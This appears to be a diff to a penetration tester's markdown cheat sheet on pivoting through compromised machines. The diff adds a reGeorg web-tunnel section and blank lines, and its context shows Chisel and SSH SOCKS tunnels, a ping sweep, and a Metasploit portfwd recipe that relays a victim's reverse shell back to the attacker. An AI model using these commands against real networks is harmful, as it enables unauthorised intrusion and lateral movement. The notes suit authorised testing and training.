@@ -12,6 +12,8 @@ route add 10.10.10.0 255.255.255.0 1,2,3(session id)
 ```
 
 
+
+
 # Proxy
 ## SSH Proxy
 - Execute following command on the compromised machine
@@ -20,6 +22,10 @@ route add 10.10.10.0 255.255.255.0 1,2,3(session id)
 ```
 ssh -D 4444 compromised_machine@192.168.1.110
 ```
+
+
+
+
 
 ## Chisel Proxy
 ### Chisel Reverse
@@ -39,6 +45,11 @@ chisel client --fingerprint "       " 192.168.1.100:8080 0.0.0.0:9999:192.168.1.
 ```
 
 
+
+
+
+
+
 # Metasploit PortForwarding and Getting ReverseShell Instead of Bindshell
 - Need meterpreter session on compromised machine
 - Route traffic inside internal network
@@ -48,6 +59,11 @@ portfwd add -R -L 10.10.16.3(attacking machine ip) -l 8888(attacking machine por
 - Open another msfconsole with multi/handler and set lhost to 0.0.0.0(attacking machine) , set lport to 8888(attacking machine port)
 - In revershell payload set lhost to 10.0.24.164(compromised machine 1) set lport to -p 7777(compromised machine 1 port)
 - What happened is when victim connect reverse shell back, it connect to compromised machine 1 first on port 7777, but it is forwarded to 0.0.0.0(attacking machine) on port 8888 and got the connection.
+
+
+
+
+
 
 # SSH Port Forwarding 
 
@@ -65,6 +81,13 @@ powershell
 ```
 for i in {1..254}; do ping -c1 -W1 192.168.1.${i} & done | grep
 ```
+
+
+
+
+
+
+
 
 
 # Important!!
@@ -94,4 +117,18 @@ chisel server --sock5 --reverse
 ```
 chisel client --fingerprint "fingerprint_generated_from_attacking_machine" 192.168.1.100:8080(ip and port of server) R:8000:192.168.2.100:80
 ```
+
+
+
+
+
+
+# reGeorg (Used for unprivileged user compromised)
+
+- On attacker machine
+- On victim machine, upload tunnel.php
+```
+python reGeorgproxy.py -p 9050 -u http://ipaddress:port/
+```
+
 
